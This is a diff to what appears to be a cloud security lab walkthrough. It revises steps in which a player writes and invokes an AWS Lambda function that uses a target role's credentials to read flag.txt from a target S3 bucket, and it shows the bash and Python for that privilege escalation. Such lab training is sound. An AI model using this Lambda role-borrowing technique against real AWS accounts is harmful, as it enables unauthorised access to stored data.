@@ -48,16 +48,19 @@ Note the bucket name — you will need it when invoking the Lambda function. The
 
 ### Step 1: Write the Lambda payload
 
-The function needs to read `flag.txt` from the target bucket and return it in the response body so you can extract it after invocation. Using boto3, this is straightforward because the function will execute under the target role's credentials automatically:
+The function needs to read `flag.txt` from the target bucket and return it in the response body so you can extract it after invocation. The bucket name is baked into the handler at write time: the heredoc's `EOF` is deliberately unquoted, so the shell expands your `TARGET_BUCKET` value into the code before it is zipped. That keeps the invocation payload empty — the player terminal's AWS CLI v2 rejects a raw JSON `--payload`, so the bucket travels inside the function instead of the event. Using boto3 needs no credential handling, because the function will execute under the target role's credentials automatically:
 
 ```bash
-cat > /tmp/lambda_function.py << 'EOF'
+TARGET_BUCKET=<paste the target_bucket_name output here>
+
+cat > /tmp/lambda_function.py << EOF
 import boto3
 import json
+import os
 
 def lambda_handler(event, context):
     s3 = boto3.client('s3')
-    bucket = event.get('bucket')
+    bucket = os.environ.get('TARGET_BUCKET', '${TARGET_BUCKET}')
     obj = s3.get_object(Bucket=bucket, Key='flag.txt')
     flag = obj['Body'].read().decode('utf-8')
     return {
@@ -136,14 +139,12 @@ aws lambda wait function-active --function-name pl-lambda-006-to-bucket-escalati
 
 ### Step 5: Invoke the function
 
-Pass the bucket name in the event payload so the function knows where to look for `flag.txt`:
+The handler already knows where to look for `flag.txt` — your `TARGET_BUCKET` was baked into it in Step 1 — so the invocation payload is empty:
 
 ```bash
-TARGET_BUCKET=<paste the target_bucket_name output here>
-
 aws lambda invoke \
   --function-name "pl-lambda-006-to-bucket-escalation" \
-  --payload "{\"bucket\": \"${TARGET_BUCKET}\"}" \
+  --payload '{}' \
   /tmp/lambda_output.json
 
 cat /tmp/lambda_output.json
